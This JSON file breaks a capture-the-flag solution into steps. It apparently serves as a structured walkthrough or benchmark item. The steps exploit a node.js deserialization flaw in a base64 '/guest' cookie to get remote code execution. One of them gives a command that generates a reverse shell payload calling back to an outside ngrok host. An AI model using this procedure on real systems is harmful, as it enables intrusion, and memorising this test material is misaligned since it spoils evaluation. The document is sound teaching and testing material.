{
    "AttackModel": {
        "Steps": [
            {
                "StepNumber": 1,
                "StepString": "Inspect the given source code and identify the '/guest' endpoint which deserializes the base 64 decoded 'guest' cookie",
                "Substeps": [
                    {
                        "SubstepNumber": 1.1,
                        "SubstepString": "Inspect the given source code."
                    },
                    {
                        "SubstepNumber": 1.2,
                        "SubstepString": "Identify the '/guest' endpoint."
                    },
                    {
                        "SubstepNumber": 1.3,
                        "SubstepString": "Recognize that the 'guest' cookie is base 64 decoded in the deserialization process."
                    }
                ]
            },
            {
                "StepNumber": 2,
                "StepString": "Recognize there's a well-known deserialization vulnerability in node.js that could lead to Remote Code Execution (RCE)",
                "Substeps": [
                    {
                        "SubstepNumber": 2.1,
                        "SubstepString": "Recognize that there's a well-known deserialization vulnerability in node.js."
                    },
                    {
                        "SubstepNumber": 2.2,
                        "SubstepString": "Understand that this vulnerability could lead to Remote Code Execution (RCE)."
                    }
                ]
            },
            {
                "StepNumber": 3,
                "StepString": "Understand by passing a serialized object into 'serialize.unserialize()', RCE can be achieved through a JavaScript Immediately Invoked Function Expression (IIFE)",
                "Substeps": [
                    {
                        "SubstepNumber": 3.1,
                        "SubstepString": "Understand that RCE can be achieved by passing a serialized object into 'serialize.unserialize()'."
                    },
                    {
                        "SubstepNumber": 3.2,
                        "SubstepString": "Understand that a JavaScript Immediately Invoked Function Expression (IIFE) can be used for RCE."
                    }
                ]
            },
            {
                "StepNumber": 4,
                "StepString": "Plan to execute a reverse shell payload within the function that would be fired when the data is deserialized",
                "Substeps": [
                    {
                        "SubstepNumber": 4.1,
                        "SubstepString": "Plan to execute a reverse shell payload."
                    },
                    {
                        "SubstepNumber": 4.2,
                        "SubstepString": "Understand that the reverse shell payload will be fired when the data is deserialized."
                    }
                ]
            },
            {
                "StepNumber": 5,
                "StepString": "Use 'nodejsshell.py' to craft such a payload, with the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel",
                "SubstepString": "Use 'nodejsshell.py' to craft a reverse shell payload.",
                "Substeps": [
                    {
                        "SubstepNumber": 5.1,
                        "SubstepString": "Craft a reverse shell payload using 'nodejsshell.py'."
                    },
                    {
                        "SubstepNumber": 5.2,
                        "SubstepString": "Use the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel."
                    }
                ]
            },
            {
                "StepNumber": 6,
                "StepString": "Copy the output into the function body",
                "Substeps": [
                    {
                        "SubstepNumber": 6.1,
                        "SubstepString": "Copy the output from the crafted reverse shell payload."
                    },
                    {
                        "SubstepNumber": 6.2,
                        "SubstepString": "Paste the copied output into the function body."
                    }
                ]
            },
            {
                "StepNumber": 7,
                "StepString": "Test your payload to make sure it works",
                "Substeps": [
                    {
                        "SubstepNumber": 7.1,
                        "SubstepString": "Test the payload to ensure it works."
                    }
                ]
            },
            {
                "StepNumber": 8,
                "StepString": "Encode the payload to base 64",
                "Substeps": [
                    {
                        "SubstepNumber": 8.1,
                        "SubstepString": "Encode the payload to base 64."
                    }
                ]
            },
            {
                "StepNumber": 9,
                "StepString": "Send the encoded payload through the cookie header",
                "Substeps": [
                    {
                        "SubstepNumber": 9.1,
                        "SubstepString": "Send the encoded payload through the cookie header."
                    }
                ]
            },
            {
                "StepNumber": 10,
                "StepString": "Establish a reverse shell which lets you read the flag",
                "Substeps": [
                    {
                        "SubstepNumber": 10.1,
                        "SubstepString": "Establish a reverse shell."
                    },
                    {
                        "SubstepNumber": 10.2,
                        "SubstepString": "Read the flag using the established reverse shell."
                    }
                ]
            }
        ]
    }
}